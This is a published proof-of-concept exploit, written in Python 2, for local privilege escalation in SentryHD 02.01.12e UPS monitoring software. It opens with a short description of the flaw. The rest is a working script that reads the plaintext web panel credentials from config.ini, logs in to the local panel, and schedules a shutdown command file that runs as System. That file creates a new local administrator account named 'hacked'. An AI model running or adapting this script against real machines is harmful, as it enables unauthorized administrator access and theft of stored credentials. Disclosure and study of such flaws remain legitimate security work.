'''
# Exploit Title: SentryHD 02.01.12e Privilege Escalation
# Date: 18-01-2017
# Software Link: http://www.minutemanups.com/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: local
 
1. Description

Every user can read: c:\Program Files (x86)\SentryHD\config.ini.

Inside this ini file we can find login and password for web panel.

UPSMan is running on autostart as System.

Using Execute Command File we can execute commands on Scheduled system shutdown as System.

https://security.szurek.pl/sentryhd-020112e-privilege-escalation.html

2. Proof of Concept
'''

import ConfigParser
import hashlib
import re
import urllib2
import urllib
from cookielib import CookieJar
import os
import datetime
import subprocess
import time

new_user_name = "hacked"

print ("SentryHD 02.01.12e Privilege Escalation")
print ("by Kacper Szurek")
print ("http://security.szurek.pl/")
print ("https://twitter.com/KacperSzurek")

config = ConfigParser.RawConfigParser()
config.read('c:\\Program Files (x86)\\SentryHD\\config.ini')

admin_user = config.get("Web", 'User0')
admin_password = config.get("Web", 'Password0')

print ("[+] Find admin user: '{}' and password: '{}'".format(admin_user, admin_password))

cj = CookieJar()
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

challenge = re.search("\"Challenge\" value=\"(.*?)\"", opener.open("http://localhost/").read())

formdata = { "Username" : admin_user, "Password": admin_password, "Challenge" : challenge, "Response":  hashlib.md5((admin_user+admin_password+challenge.group(1)).encode()).hexdigest()}
opener.open("http://localhost/delta/login", urllib.urlencode(formdata))

if "calcResponse()" in opener.open("http://localhost/home.asp").read():
	print ("[-] Failed to login")
	os._exit(0)

bat_path = os.path.dirname(os.path.abspath(__file__))+"\\create_user.bat"
payload = open(bat_path, "w")
payload.write("net user {} /add\n".format(new_user_name))
payload.write("net localgroup Administrators {} /add".format(new_user_name))
payload.close()

print ("[+] Create payload: {}".format(bat_path))

formdata = {"ACT_SHUT_TYPE":0, "ACT_UPS_DELAY":10, "ACT_PF_EN": "on", "ACT_OSD_PF":999, "ACT_BL_EN": "on", "ACT_OSD_BL":999, "ACT_SS_EN":"on","ACT_OSD_SS":999, "ACT_LS_EN":"on", "ACT_LS_DELAY":999, "SUB_SHUTDOWN":"Submit"}
opener.open("http://localhost/delta/mgnt_reaction", urllib.urlencode(formdata))

formdata = {"ACT_MSG_EN":1, "ACT_MSG_PERIOD":999, "ACT_CMD_EN":1, "ACT_CMD_FILE":bat_path, "ACT_CMD_BEFORE": 990, "SUB_REACTION":"Submit"}
opener.open("http://localhost/delta/mgnt_reaction", urllib.urlencode(formdata))


current_time = datetime.datetime.today()+datetime.timedelta(0,90)
shutdown_date = current_time.strftime('%m/%d/%Y')
shutdown_time = current_time.strftime('%H:%M')

formdata = {"SSH_SD1":shutdown_date, "SSH_TM1":shutdown_time, "SSH_ACT1":1}
opener.open("http://localhost/delta/mgnt_sschedule", urllib.urlencode(formdata))

print ("[+] Set shutdown time: {} {}".format(shutdown_date, shutdown_time))

print ("[+] Waiting for user creation")
i = 0
while True:
	if i > 100:
		print ("[-] Exploit failed")
		os._exit(0)

	netuser, _ = subprocess.Popen("net users", stdout=subprocess.PIPE, stderr=None, shell=False).communicate()

	if new_user_name in netuser:
		break

	print "." ,
	time.sleep(2)
	i += i

print ("\n[+] Account created, cancel shutdown")

formdata = {"SHUT_CANCEL":"Cancel Countdown"}
opener.open("http://localhost/delta/mgnt_control", urllib.urlencode(formdata))

print ("[+] OK")
            
